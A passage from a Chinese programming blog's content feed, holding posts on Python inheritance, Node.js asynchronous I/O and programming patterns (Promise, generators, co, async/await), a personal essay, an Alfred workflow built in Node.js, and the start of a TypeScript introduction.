self，指向调用该方法的实例本身，其他参数和普通函数是一样的 return self.agechild1 = Person('Xiao Ming', 10)child2 = Person('Xiao Hong', 9)print child1.name # 'Xiao Ming'print child2.get_age() # 9print child1.address # 'Earth'print child2.address # 'Earth' 继承child 属于 Student 类，Student 类属于 People 类，这就引出了继承: 即获得了父类的方法属性后又能添加自己的方法属性。 12345678910111213class Person(object): def __init__(self, name, age): self.name = name self.age = ageclass Student(Person): def __init__(self, name, age, grade): super(Student, self).__init__(name, age) # 这里也能写成 Person.__init__(self, name, age) self.grade = grades = Student('Xiao Ming', 10, 90)print s.name # 'Xiao Ming'print s.grade # 90 可以看到子类在父类的基础上又增加了 grade 属性。我们可以再来看看 s 的类型。 12isinstance(s, Person)isinstance(s, Student) 可以看出，Python 中在一条继承链上，一个实例可以看成它本身的类型，也可以看成它父类的类型。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js 异步异闻录]]></title>
    <url>%2Fblog%2F2017%2F09%2F22%2FNode.js%20%E5%BC%82%E6%AD%A5%E5%BC%82%E9%97%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[提到 Node.js, 我们脑海就会浮现异步、非阻塞、单线程等关键词，进一步我们还会想到 buffer、模块机制、事件循环、进程、V8、libuv 等知识点。本文起初旨在理顺 Node.js 以上易混淆概念，然而一入异步深似海，本文尝试基于 Node.js 的异步展开讨论，其他的主题只能日后慢慢补上了。(附：亦可以把本文当作是朴灵老师所著的《深入浅出 Node.js》一书的小结)。 异步 I/ONode.js 正是依靠构建了一套完善的高性能异步 I/O 框架，从而打破了 JavaScript 在服务器端止步不前的局面。 异步 I/O VS 非阻塞 I/O听起来异步和非阻塞，同步和阻塞是相互对应的，从实际效果而言，异步和非阻塞都达到了我们并行 I/O 的目的，但是从计算机内核 I/O 而言，异步/同步和阻塞/非阻塞实际上是两回事。 注意，操作系统内核对于 I/O 只有两种方式：阻塞与非阻塞。 调用阻塞 I/O 的过程： 调用非阻塞 I/O 的过程： 在此先引人一个叫作轮询的技术。轮询不同于回调，举个生活例子，你有事去隔壁寝室找同学，发现人不在，你怎么办呢？方法1，每隔几分钟再去趟隔壁寝室，看人在不；方法2，拜托与他同寝室的人，看到他回来时叫一下你；那么前者是轮询，后者是回调。 再回到主题，阻塞 I/O 造成 CPU 等待浪费，非阻塞 I/O 带来的麻烦却是需要轮询去确认是否完全完成数据获取。从操作系统的这个层面上看，对于应用程序而言，不管是阻塞 I/O 亦或是 非阻塞 I/O，它们都只能是一种同步，因为尽管使用了轮询技术，应用程序仍然需要等待 I/O 完全返回。 Node 的异步 I/O完成整个异步 I/O 环节的有事件循环、观察者、请求对象以及 I/O 线程池。 事件循环在进程启动的时候，Node 会创建一个类似于 whlie(true) 的循环，每一次执行循环体的过程我们称为 Tick。 每个 Tick 的过程就是查看是否有事件待处理，如果有，就取出事件及其相关的回调函数。如果存在相关的回调函数，就执行他们。然后进入下一个循环，如果不再有事件处理，就退出进程。 伪代码如下：12345678while(ture) &#123; const event = eventQueue.pop() if (event &amp;&amp; event.handler) &#123; event.handler.execute() // execute the callback in Javascript thread &#125; else &#123; sleep() // sleep some time to release the CPU do other stuff &#125;&#125; 观察者每个 Tick 的过程中，如何判断是否有事件需要处理，这里就需要引入观察者这个概念。 每个事件循环中有一个或多个观察者，而判断是否有事件需要处理的过程就是向这些观察者询问是否有要处理的事件。 在 Node 中，事件主要来源于网络请求、文件 I/O 等，这些事件都有对应的观察者。 请求对象对于 Node 中的异步 I/O 而言，回调函数不由开发者来调用，在 JavaScript 发起调用到内核执行完 id 操作的过渡过程中，存在一种中间产物，它叫作请求对象。 请求对象是异步 I/O 过程中的重要中间产物，所有状态都保存在这个对象中，包括送入线程池等待执行以及 I/O 操作完后的回调处理 以 fs.open() 为例：12345678fs.open = function(path, flags, mode, callback) &#123; bingding.open( pathModule._makeLong(path), stringToFlags(flags), mode, callback )&#125; fs.open 的作用就是根据指定路径和参数去打开一个文件，从而得到一个文件描述符。 从前面的代码中可以看到，JavaScript 层面的代码通过调用 C++ 核心模块进行下层的操作。 从 JavaScript 调用 Node 的核心模块，核心模块调用 C++ 内建模块，内建模块通过 libuv 进行系统调用，这是 Node 里经典的调用方式。 libuv 作为封装层，有两个平台的实现，实质上是调用了 uv_fs_open 方法，在 uv_fs_open 的调用过程中，会创建一个 FSReqWrap 请求对象，从 JavaScript 层传入的参数和当前方法都被封装在这个请求对象中。回调函数则被设置在这个对象的 oncomplete_sym 属性上。 1req_wrap -&gt; object_ -&gt; Set(oncomplete_sym, callback) 对象包装完毕后，在 Windows 下，则调用 QueueUserWorkItem() 方法将这个 FSReqWrap 对象推人线程池中等待执行。 至此，JavaScript 调用立即返回，由 JavaScript 层面发起的异步调用的第一阶段就此结束(即上图所注释的异步 I/O 第一部分)。JavaScript 线程可以继续执行当前任务的后续操作，当前的 I/O 操作在线程池中等待执行，不管它是否阻塞 I/O，都不会影响到 JavaScript 线程的后续操作，如此达到了异步的目的。 执行回调组装好请求对象、送入 I/O 线程池等待执行，实际上是完成了异步 I/O 的第一部分，回调通知是第二部分。 线程池中的 I/O 操作调用完毕之后，会将获取的结果储存在 req -&gt; result 属性上，然后调用 PostQueuedCompletionStatus() 通知 IOCP，告知当前对象操作已经完成，并将线程归还线程池。 在这个过程中，我们动用了事件循环的 I/O 观察者，在每次 Tick 的执行过程中，它会调用 IOCP 相关的 GetQueuedCompletionStatus 方法检查线程池中是否有执行完的请求，如果存在，会将请求对象加入到 I/O 观察者的队列中，然后将其当做事件处理。 I/O 观察者回调函数的行为就是取出请求对象的 result 属性作为参数，取出 oncomplete_sym 属性作为方法，然后调用执行，以此达到调用 JavaScript 中传入的回调函数的目的。 小结通过介绍完整个异步 I/O 后，有个需要重视的观点是 JavaScript 是单线程的，Node 本身其实是多线程的，只是 I/O 线程使用的 CPU 比较少；还有个重要的观点是，除了用户的代码无法并行执行外，所有的 I/O (磁盘 I/O 和网络 I/O) 则是可以并行起来的。 异步编程Node 是首个将异步大规模带到应用层面的平台。通过上文所述我们了解了 Node 如何通过事件循环实现异步 I/O，有异步 I/O 必然存在异步编程。异步编程的路经历了太多坎坷，从回调函数、发布订阅模式、Promise 对象，到 generator、asycn/await。趁着异步编程这个主题刚好把它们串起来理理。 异步 VS 回调对于刚接触异步的新人，很大几率会混淆回调 (callback) 和异步 (asynchronous) 的概念。先来看看维基的 Callback) 条目: In computer programming, a callback is any executable code that is passed as an argument to other code 因此，回调本质上是一种设计模式，并且 jQuery (包括其他框架)的设计原则遵循了这个模式。 在 JavaScript 中，回调函数具体的定义为：函数 A 作为参数(函数引用)传递到另一个函数 B 中，并且这个函数 B 执行函数 A。我们就说函数 A 叫做回调函数。如果没有名称(函数表达式)，就叫做匿名回调函数。 因此 callback 不一定用于异步，一般同步(阻塞)的场景下也经常用到回调，比如要求执行某些操作后执行回调函数。讲了这么多让我们来看下同步回调和异步回调的例子： 同步回调：12345678910function f2() &#123; console.log('f2 finished')&#125;function f1(cb) &#123; cb() console.log('f1 finished')&#125;f1(f2) // 得到的结果是 f2 finished, f1 finished 异步回调：12345678910function f2() &#123; console.log('f2 finished')&#125;function f1(cb) &#123; setTimeout(cb, 1000) // 通过 setTimeout() 来模拟耗时操作 console.log('f1 finished')&#125;f1(f2) // 得到的结果是 f1 finished, f2 finished 小结：回调可以进行同步也可以异步调用，但是 Node.js 提供的 API 大多都是异步回调的，比如 buffer、http、cluster 等模块。 发布/订阅模式事件发布/订阅模式 (PubSub) 自身并无同步和异步调用的问题，但在 Node 的 events 模块的调用中多半伴随事件循环而异步触发的，所以我们说事件发布/订阅广泛应用于异步编程。它的应用非常广泛，可以在异步编程中帮助我们完成更松的解耦，甚至在 MVC、MVVC 的架构中以及设计模式中也少不了发布-订阅模式的参与。 以 jQuery 事件监听为例 12345$('#btn').on('myEvent', function(e) &#123; // 触发事件 console.log('I am an Event')&#125;)$('#btn').trigger('myEvent') // 订阅事件 可以看到，订阅事件就是一个高阶函数的应用。事件发布/订阅模式可以实现一个事件与多个回调函数的关联，这些回调函数又称为事件侦听器。下面我们来看看发布/订阅模式的简易实现。 1234567891011121314151617181920212223242526var PubSub = function() &#123; this.handlers = &#123;&#125;&#125;PubSub.prototype.subscribe = function(eventType, handler) &#123; // 注册函数逻辑 if (!(eventType in this.handlers)) &#123; this.handlers[eventType] = [] &#125; this.handlers[eventType].push(handler) // 添加事件监听器 return this // 返回上下文环境以实现链式调用&#125;PubSub.prototype.publish = function(eventType) &#123; // 发布函数逻辑 var _args = Array.prototype.slice.call(arguments, 1) for (var i = 0, _handlers = this.handlers[eventType]; i &lt; _handlers.length; i++) &#123; // 遍历事件监听器 _handlers[i].apply(this, _args) // 调用事件监听器 &#125;&#125;var event = new PubSub // 构造 PubSub 实例event.subscribe('name', function(msg) &#123; console.log('my name is ' + msg) // my name is muyy&#125;)event.publish('name', 'muyy') 至此，一个简易的订阅发布模式就实现了。然而发布/订阅模式也存在一些缺点，创建订阅本身会消耗一定的时间与内存，也许当你订阅一个消息之后，之后可能就不会发生。发布-订阅模式虽然它弱化了对象与对象之间的关系，但是如果过度使用，对象与对象的必要联系就会被深埋，会导致程序难以跟踪与维护。 Promise/Deferred 模式想象一下，如果某个操作需要经过多个非阻塞的 IO 操作，每一个结果都是通过回调，程序有可能会看上去像这个样子。这样的代码很难维护。这样的情况更多的会发生在 server side 的情况下。代码片段如下： 123456789operation1(function(err, result1) &#123; operation2(result1, function(err, result2) &#123; operation3(result2, function(err, result3) &#123; operation4(result3, function(err, result4) &#123; callback(result4) // do something useful &#125;) &#125;) &#125;)&#125;) 这时候，Promise 出现了，其出现的目的就是为了解决所谓的回调地狱的问题。让我们看下使用 Promise 后的代码片段： 1234567891011promise() .then(operation1) .then(operation2) .then(operation3) .then(operation4) .then(function(value4) &#123; // Do something with value4 &#125;, function (error) &#123; // Handle any error from step1 through step4 &#125;) .done() 可以看到，使用了第二种编程模式后能极大地提高我们的编程体验，接着就让我们自己动手实现一个支持序列执行的 Promise。(附：为了直观的在浏览器上也能感受到 Promise，为此也写了一段浏览器上的 Promise 用法示例) 在此之前，我们先要了解 Promise/A 提议中对单个异步操作所作的抽象定义，定义具体如下所示： Promise 操作只会处在 3 种状态的一种：未完成态、完成态和失败态。 Promise 的状态只会出现从未完成态向完成态或失败态转化，不能逆反。完成态和失败态不能相互转化。 Promise 的状态一旦转化，将不能被更改。 Promise 的状态转化示意图如下： 除此之外，Promise 对象的另一个关键就是需要具备 then() 方法，对于 then() 方法，有以下简单的要求: 接受完成态、错误态的回调方法。在操作完成或出现错误时，将会调用对应方法。 then() 方法只接受 function 对象，其余对象将被忽略。 then() 方法继续返回 Promise 对象，已实现链式调用。 then() 方法的定义如下：1then(fulfilledHandler, errorHandler) 有了这些核心知识，接着进入 Promise/Deferred 核心代码环节： 1234567891011121314151617var Promise = function() &#123; // 构建 Promise 对象 // 队列用于存储执行的回调函数 this.queue = [] this.isPromise = true&#125;Promise.prototype.then = function (fulfilledHandler, errorHandler) &#123; // 构建 Progress 的 then 方法 var handler = &#123;&#125; if (typeof fulfilledHandler === 'function') &#123; handler.fulfilled = fulfilledHandler &#125; if (typeof errorHandler === 'function') &#123; handler.error = errorHandler &#125; this.queue.push(handler) return this&#125; 如上 Promise 的代码就完成了，但是别忘了 Promise/Deferred 中的后者 Deferred，为了完成 Promise 的整个流程，我们还需要触发执行上述回调函数的地方，实现这些功能的对象就叫作 Deferred，即延迟对象。 Promise 和 Deferred 的整体关系如下图所示，从中可知，Deferred 主要用于内部来维护异步模型的状态；而 Promise 则作用于外部，通过 then() 方法暴露给外部以添加自定义逻辑。 接着来看 Deferred 代码部分的实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var Deferred = function() &#123; this.promise = new Promise()&#125;// 完成态Deferred.prototype.resolve = function(obj) &#123; var promise = this.promise var handler while(handler = promise.queue.shift()) &#123; if (handler &amp;&amp; handler.fulfilled) &#123; var ret = handler.fulfilled(obj) if (ret &amp;&amp; ret.isPromise) &#123; // 这一行以及后面3行的意思是：一旦检测到返回了新的 Promise 对象，停止执行，然后将当前 Deferred 对象的 promise 引用改变为新的 Promise 对象，并将队列中余下的回调转交给它 ret.queue = promise.queue this.promise = ret return &#125; &#125; &#125;&#125;// 失败态Deferred.prototype.reject = function(err) &#123; var promise = this.promise var handler while (handler = promise.queue.shift()) &#123; if (handler &amp;&amp; handler.error) &#123; var ret = handler.error(err) if (ret &amp;&amp; ret.isPromise) &#123; ret.queue = promise.queue this.promise = ret return &#125; &#125; &#125;&#125;// 生成回调函数Deferred.prototype.callback = function() &#123; var that = this return function(err, file) &#123; if(err) &#123; return that.reject(err) &#125; that.resolve(file) &#125;&#125; 接着我们以两次文件读取作为例子，来验证该设计的可行性。这里假设第二个文件读取依赖于第一个文件中的内容，相关代码如下： 1234567891011121314151617var readFile1 = function(file, encoding) &#123; var deferred = new Deferred() fs.readFile(file, encoding, deferred.callback()) return deferred.promise&#125;var readFile2 = function(file, encoding) &#123; var deferred = new Deferred() fs.readFile(file, encoding, deferred.callback()) return deferred.promise&#125;readFile1('./file1.txt', 'utf8').then(function(file1) &#123; // 这里通过 then 把两个回调存进队列中 return readFile2(file1, 'utf8')&#125;).then(function(file2) &#123; console.log(file2) // I am file2.&#125;) 最后可以看到控制台输出 I am file2，验证成功~，这个案例的完整代码可以点这里查看，并建议使用 node-inspector 进行断点观察，(这段代码里面有些逻辑确实很绕，通过断点调试就能较容易理解了)。 从 Promise 链式调用可以清晰地看到队列(先进先出)的知识，其有如下两个核心步骤： 将所有的回调都存到队列中； Promise 完成时，逐个执行回调，一旦检测到返回了新的 Promise 对象，停止执行，然后将当前 Deferred 对象的 promise 引用改变为新的 Promise 对象，并将队列中余下的回调转交给它； 至此，实现了 Promise/Deferred 的完整逻辑，Promise 的其他知识未来也会继续探究。 Generator尽管 Promise 一定程度解决了回调地狱的问题，但是对于喜欢简洁的程序员来说，一大堆的模板代码 .then(data =&gt; {...}) 显得不是很友好。所以爱折腾的开发者们在 ES6 中引人了 Generator 这种数据类型。仍然以读取文件为例，先上一段非常简洁的 Generator + co 的代码： 123456co(function* () &#123; const file1 = yield readFile('./file1.txt') const file2 = yield readFile('./file2.txt') console.log(file1) console.log(file2)&#125;) 可以看到比 Promise 的写法简洁了许多。后文会给出 co 库的实现原理。在此之前，先归纳下什么是 Generator。可以把 Generator 理解为一个可以遍历的状态机，调用 next 就可以切换到下一个状态，其最大特点就是可以交出函数的执行权（即暂停执行），让我们看如下代码： 1234567891011121314151617function* gen(x) &#123; yield (function() &#123;return 1&#125;)() var y = yield x + 2 return y&#125;// 调用方式一var g = gen(1)g.next() // &#123; value: 1, done: false &#125;g.next() // &#123; value: 3, done: false &#125;g.next() // &#123; value: undefined, done: true &#125;// 调用方式二var g = gen(1)g.next() // &#123; value: 1, done: false &#125;g.next() // &#123; value: 3, done: false &#125;g.next(10) // &#123; value: 10, done: true &#125; 由此我们归纳下 Generator 的基础知识： Generator 生成迭代器后，等待迭代器的 next() 指令启动。 启动迭代器后，代码会运行到 yield 处停止。并返回一个 {value: AnyType, done: Boolean} 对象，value 是这次执行的结果，done 是迭代是否结束。并等待下一次的 next() 指令。 next() 再次启动，若 done 的属性不为 true，则可以继续从上一次停止的地方继续迭代。 一直重复 2，3 步骤，直到 done 为 true。 通过调用方式二，我们可看到 next 方法可以带一个参数，该参数就会被当作上一个 yield 语句的返回值。 另外我们注意到，上述代码中的第一种调用方式中的 y 值是 undefined，如果我们真想拿到 y 值，就需要通过 g.next(); g.next().value 这种方式取出。可以看出，Generator 函数将异步操作表示得很简洁，但是流程管理却不方便。这时候用于 Generator 函数的自动执行的 co 函数库 登场了。为什么 co 可以自动执行 Generator 函数呢？我们知道，Generator 函数就是一个异步操作的容器。它的自动执行需要一种机制，当异步操作有了结果，能够自动交回执行权。 两种方法可以做到这一点： Thunk 函数。将异步操作包装成 Thunk 函数，在回调函数里面交回执行权。 Promise 对象。将异步操作包装成 Promise 对象，用 then 方法交回执行权。 co 函数库其实就是将两种自动自动执行器(Thunk 函数和 Promise 对象)，包装成一个库。使用 co 的前提条件是，Generator 函数的 yield 命令后面，只能是 Thunk 函数或者是 Promise 对象。下面分别用以上两种方法对 co 进行一个简单的实现。 基于 Thunk 函数的自动执行在 JavaScript 中，Thunk 函数就是指将多参数函数替换成单参数的形式，并且其只接受回调函数作为参数的函数。Thunk 函数的例子如下： 123456789// 正常版本的 readFile(多参数)fs.readFile(filename, 'utf8', callback)// Thunk 版本的 readFile(单参数)function readFile(filename) &#123; return function(callback) &#123; fs.readFile(filename, 'utf8', callback); &#125;;&#125; 在基于 Thunk 函数和 Generator 的知识上，接着我们来看看 co 基于 Thunk 函数的实现。(附：代码参考自co最简版实现) 1234567891011121314151617function co(generator) &#123; return function(fn) &#123; var gen = generator() function next(err, result) &#123; if(err) &#123; return fn(err) &#125; var step = gen.next(result) if (!step.done) &#123; step.value(next) // 这里可以把它联想成递归；将异步操作包装成 Thunk 函数，在回调函数里面交回执行权。 &#125; else &#123; fn(null, step.value) &#125; &#125; next() &#125;&#125; 用法如下：12345678910co(function* () &#123; // 把 function*() 作为参数 generator 传入 co 函数 var file1 = yield readFile('./file1.txt') var file2 = yield readFile('./file2.txt') console.log(file1) // I'm file1 console.log(file2) // I'm file2 return 'done'&#125;)(function(err, result) &#123; // 这部分的 function 作为 co 函数内的 fn 的实参传入 console.log(result) // done&#125;) 上述部分关键代码已进行注释，下面对 co 函数里的几个难点进行说明： var step = gen.next(result), 前文提到的一句话在这里就很有用处了：next方法可以带一个参数，该参数就会被当作上一个yield语句的返回值;在上述代码的运行中一共会经过这个地方 3 次，result 的值第一次是空值，第二次是 file1.txt 的内容 I’m file1，第三次是 file2.txt 的内容 I’m file2。根据上述关键语句的提醒，所以第二次的内容会作为 file1 的值(当作上一个yield语句的返回值)，同理第三次的内容会作为 file2 的值。 另一处是 step.value(next), step.value 就是前面提到的 thunk 函数返回的 function(callback) {}, next 就是传入 thunk 函数的 callback。这句代码是条递归语句，是这个简易版 co 函数能自动调用 Generator 的关键语句。 建议亲自跑一遍代码，多打断点，从而更好地理解，代码已上传github。 基于 Promise 对象的自动执行基于 Thunk 函数的自动执行中，yield 后面需跟上 Thunk 函数，在基于 Promise 对象的自动执行中，yield 后面自然要跟 Promise 对象了，让我们先构建一个 readFile 的 Promise 对象： 12345678function readFile(fileName) &#123; return new Promise(function(resolve, reject) &#123; fs.readFile(fileName, function(error, data) &#123; if (error) reject(error) resolve(data) &#125;) &#125;)&#125; 在基于前文 Promise 对象和 Generator 的知识上，接着我们来看看 co 基于 Promise 函数的实现: 123456789101112function co(generator) &#123; var gen = generator() function next(data) &#123; var result = gen.next(data) // 同上，经历了 3 次，第一次是 undefined，第二次是 I'm file1，第三次是 I'm file2 if (result.done) return result.value result.value.then(function(data) &#123; // 将异步操作包装成 Promise 对象，用 then 方法交回执行权 next(data) &#125;) &#125; next()&#125; 用法如下：1234567co(function* generator() &#123; var file1 = yield readFile('./file1.txt') var file2 = yield readFile('./file2.txt') console.log(file1.toString()) // I'm file1 console.log(file2.toString()) // I'm file2&#125;) 这一部分的代码上传在这里，通过观察可以发现基于 Thunk 函数和基于 Promise 对象的自动执行方案的 co 函数设计思路几乎一致，也因此呼应了它们共同的本质 —— 当异步操作有了结果，自动交回执行权。 async看上去 Generator 已经足够好用了，但是使用 Generator 处理异步必须得依赖 tj/co，于是 asycn 出来了。本质上 async 函数就是 Generator 函数的语法糖，这样说是因为 async 函数的实现，就是将 Generator 函数和自动执行器，包装进一个函数中。伪代码如下，(注：其中 automatic 的实现可以参考 async 函数的含义和用法中的实现) 1234567891011async function fn(args)&#123; // ...&#125;// 等同于function fn(args) &#123; return automatic(function*() &#123; // automatic 函数就是自动执行器，其的实现可以仿照 co 库自动运行方案来实现，这里就不展开了 // ... &#125;)&#125; 接着仍然以上文的读取文件为例，来比较 Generator 和 async 函数的写法差异： 1234567891011// Generatorvar genReadFile = co(function*() &#123; var file1 = yield readFile('./file1.txt') var file2 = yield readFile('./file2.txt')&#125;)// 改用 async 函数var asyncReadFile = async function() &#123; var file1 = await readFile('./file1.txt') var file2 = await 1 // 等同于同步操作（如果跟上原始类型的值）&#125; 总体来说 async/await 看上去和使用 co 库后的 generator 看上去很相似，不过相较于 Generator，可以看到 Async 函数更优秀的几点： 内置执行器。Generator 函数的执行必须依靠执行器，而 Aysnc 函数自带执行器，调用方式跟普通函数的调用一样； 更好的语义。async 和 await 相较于 * 和 yield 更加语义化； 更广的适用性。前文提到的 co 模块约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面则可以是 Promise 或者原始类型的值； 返回值是 Promise。async 函数返回值是 Promise 对象，比 Generator 函数返回的 Iterator 对象方便，因此可以直接使用 then() 方法进行调用； 参考资料 深入浅出 Node.js 理解回调函数 JavaScript之异步编程简述 理解co执行逻辑 co 函数库的含义和用法 async 函数的含义和用法]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三年醇]]></title>
    <url>%2Fblog%2F2017%2F08%2F29%2F2017-08-29-memory-overflow%2F</url>
    <content type="text"><![CDATA[快三个月没写博客了，长草了。最近生活和工作上都发生了不少事情，在这个百感交集的夜晚，突然想说点什么。 首先，要给大家公布一个事儿，小胡子哥在昨天已经彻底结束单身生活，迈向了婚姻的殿堂，从此将走向人生巅峰 😛；非常感谢各位朋友的发来的祝福，请收下我的膝盖！ 生活就是如此，总是在不经意间给人数不清的惊喜。 毕业没多久便在 D2 上认识了 她，一个东北女孩，懵懵懂懂的，稀里糊涂就被我忽悠到了杭州——这个「只有我」的城市。经过我三番五次的穷追猛打，几个月下来，她已经略显「疲惫」，渐渐地，露出了爱意。那一年，仿佛自己又回到了 18 岁。 从相识到相知到相恋，我们留下了不少美好的回忆；那一阵子的甜蜜后，两个人也开始了小吵小闹，进入一段爱情磨合期。细细品来，这也算是生活的乐趣吧~ 前段时间，公司系统邮件提醒我，三年了。 我时常拷问自己，我要去哪里？这三年就是摸索过来的，不断给自己设定目标、调整方向、探索前路；也十分感激在路上给我指点迷津的各位前辈，把迷茫的我从沟里带出来，让我倍受这个社会的温暖。 还记得，刚毕业那会儿整个人是一愣一愣的，感觉自己做什么事情都不周全，尽管很卖力地干，劲却使不上道。所以我也学会了观察，看别人是怎么做的，学习后模仿，模仿后学习，慢慢地，好像很多事情做起来突然就顺手了，也不知是自己开窍了，还是思维惯性了 🙄。 最怕没有目标，浑浑噩噩的，没了冲动，也没了激情，自然任何事情都干不到 90 分。 去年一年在社交上投入了太多的精力，信息在大脑里爆炸，让我有点分不清主次；说太多，做太少，让我落下了不少的功课，笔杆子还是要拿起来，写点实实在在的东西。今年，尤其是下半年，我会作出一些变化。 在阿里巴巴，会把工作的人比作一坛酒，一年香，三年醇，五年陈。前三年，是一个人绝佳的成长期，而三年到五年，应该去沉淀一些东西，我想，我到了这个阶段了。 做技术就像搞建筑一般，根基越深厚，上层建筑越牢固，也能建得更高。在往后的技术发展路上，我会遵循「巩固基层，拓宽中层，探索上层」的原则，扎扎实实地搞，一步一个脚印。 毕业三年，事在发展，人在变化。期待未来。]]></content>
      <categories>
        <category>随笔</category>
        <category>在路上</category>
        <category>观点和感想</category>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>三年</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 Node.js 把玩一番 Alfred Workflow]]></title>
    <url>%2Fblog%2F2017%2F08%2F09%2F%E4%BD%BF%E7%94%A8-Node-js-%E5%B0%8F%E7%8E%A9%E4%B8%80%E7%95%AA-Alfred-Workflow%2F</url>
    <content type="text"><![CDATA[插件地址(集成Github、掘金、知乎、淘宝等搜索) 作为 Mac 上常年位居神器榜第一位的软件来说，Alfred 给我们带来的便利是不言而喻的，其中 workflow(工作流) 功不可没，在它上面可以轻松地查找任何 api；可以快速在豆瓣上搜到自己喜欢的电影、图书、音乐；可以快速把图片上传到图床 等等。 一些安利 附上一张个人装着的插件的截图。Caffeinate 插件能在指定时间使电脑不黑屏；在 Dash 插件上能轻松查任何文档；Youdao Translate 插件比系统自带的翻译方便许多。插件也是因人而异，大家可以在 Workflow List 上逛逛，各取所需。 在用了别人的插件感觉高大上后，便萌发了也写一个插件的想法，计划把自己常逛的网站集合成一个插件，使用特定的缩略词便可快速进行搜索数据，又看了官方称可以使用 bash, zsh, PHP, Ruby, Python, Perl, Apple Script 开发 Alfred Workflow。于是我选择了 Node.js 作为开发语言，开发了一款 commonSearch, 开发完效果如下(集成了Github、掘金、知乎、淘宝等搜索)。 开发阶段在开发前，得先对一些特定的操作步骤和知识点有一定的认知，这样开发时就基本上没有大碍了。 前置步骤可以先参考 如何去写一个第三方的 workflow 的开始部分, 完成基本工作流的搭建，如下图是我搭建好的基本工作流连线。 在 Script 中，可以看到 /usr/local/bin/node common_search.js 相当于就是在调用该插件的时候起了一个 node 服务，后面的 1 是为了区分当前调用的是哪个搜索手动传入 common_search.js 的，{query} 则是用户查询的名称。 使用 Node.js 调用 JSON API最初开发参考了 知乎搜索 这个项目，它是基于 cheerio 这个模块对请求到的网页数据进行分析爬取，但是引入了 cheerio 后，插件体积多了 2M 多，这对于一个插件来说太不友好了，所以这可能是 python 之类的语言更适合开发类似插件的原因吧(猜想:python 不需要引人第三方库就能进行爬虫)，于是我开始选择提供 JSON API 的接口，比如找寻掘金返回数据的接口。首先打开 chrome 控制台，这可能对前端工程师比较熟悉了。 从而找到了掘金返回搜索数据的接口是 https://search-merger-ms.juejin.im/v1/search?query={query}&amp;page=0&amp;raw_result=false&amp;src=web 接着愉快地使用 node 提供的 https 模块，这里有一个注意点，http.get() 回调中的 res 参数不是正文，而是 http.ClientResponse 对象，所以我们需要组装内容。 12345678910111213141516171819202122232425262728293031var options = &#123; host: 'search-merger-ms.juejin.im', path: '/v1/search?query=' + encodeURI(keyword) + '&amp;page=0&amp;raw_result=false&amp;src=web' &#125; https.get(options, function (res) &#123; res.on('data', (chunk) =&gt; &#123; var content += chunk &#125;).on('end', function () &#123; var jsonContent = JSON.parse(content) &amp;&amp; JSON.parse(content).d var result_array = [] for (var i = 0; i &lt; jsonContent.length; i++) &#123; if (jsonContent[i].user.jobTitle === '') &#123; result_array.push(&#123; title: subtitle: arg: icon: &#123; path: join(__dirname, 'xx.png'), &#125;, mods: &#123; cmd: &#123;&#125; &#125; &#125;) &#125; &#125; content = '' console.log(JSON.stringify(&#123; items: result_array &#125;)) &#125;) &#125;) 这种方法应该是最直接的调用 JSON API 的方案了，当然也可以引人第三方模块 request 后解析 JSON，示例如下： 123456789101112131415161718var request = require('request')var url = 'search-merger-ms.juejin.im/v1/search?query=' + encodeURI(keyword) + '&amp;page=0&amp;raw_result=false&amp;src=web'request.get(&#123; url: url, json: true, headers: &#123;'User-Agent': 'request'&#125; &#125;, (err, res, data) =&gt; &#123; if (err) &#123; console.log('Error:', err); &#125; else if (res.statusCode !== 200) &#123; console.log('Status:', res.statusCode); &#125; else &#123; // data is already parsed as JSON: console.log(data.html_url); &#125;&#125;); 还有一点要注意的是返回值的字段是固定的，具体可以参考它的官方解释，琢磨了好久才把 JS 中的 Icon 自定义的格式找出来。 12345title: 主标题subtitle: 内容行arg: 跳转链接icons: 图标mods：定制键盘按键的方法 对于 Github、掘金、知乎、淘宝的搜索都是基于以上思路进行开发的，就是对于具体返回的 JSON 数据进行了不同处理，虽然粗糙，但也算完成了第一个 Alfred Workflow 插件的开发。 尾声本文的知识点写的不是特别丰满，一是就是对开发这个插件的小结，另外就是抛砖引玉了，能让更多的小伙伴了解开发一个插件并不是难事，同时让更多的朋友开发出更多有意义，有趣的 alfred-workflow 插件也算是本文分享的一个初衷了。]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>alfred workflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 JavaScript 到 TypeScript]]></title>
    <url>%2Fblog%2F2017%2F07%2F02%2F%E4%BB%8E-JavaScript-%E5%88%B0-TypeScript%2F</url>
    <content type="text"><![CDATA[文中的案例代码已经上传到 TypeScript TypeScript 并不是一个完全新的语言, 它是 JavaScript 的超集，为 JavaScript 的生态增加了类型机制，并最终将代码编译为纯粹的 JavaScript 代码。 TypeScript 简介TypeScript 由 Microsoft(算上 Angular 2 的话加上 Google)开发和维护的一种开源编程语言。 它支持 JavaScript 的所有语法和语义，同时通过作为 ECMAScript 的超集来提供一些额外的功能，如类型检测和更丰富的语法。下图显示了 TypeScript 与 ES5，ES2015，ES2016 之间的关系。 使用 TypeScript 的原因JavaScript 是一门弱类型语言，变量的数据类型具有动态性，只有执行时才能确定变量的类型，这种后知后觉的认错方法会让开发者成为调试大师，但无益于编程能力的提升，还会降低开发效率。TypeScript 的类型机制可以有效杜绝由变量类型引起的误用问题，而且开发者可以控制对类型的监控程度，是严格限制变量类型还是宽松限制变量类型，都取决于开发者的开发需求。添加类型机制之后，副作用主要有两个：增大了开发人员的学习曲线，增加了设定类型的开发时间。总体而言，这些付出相对于代码的健壮性和可维护性，都是值得的。 此外，类型注释是 TypeScript 的内置功能之一，允许文本编辑器和 IDE 可以对我们的代码执行更好的静态分析。 这意味着我们可以通过自动编译工具的帮助，在编写代码时减少错误，从而提高我们的生产力。 对 TypeScript 的简介到此，接下来对其特有的知识点进行简单概括总结，(网上很多教程实际上把 ES6， ES7 的知识点也算进 ts 的知识点了，当然这没错~) 数据类型String 类型一个保存字符串的文本，类型声明为 string。可以发现类型声明可大写也可小写，后文同理。12let 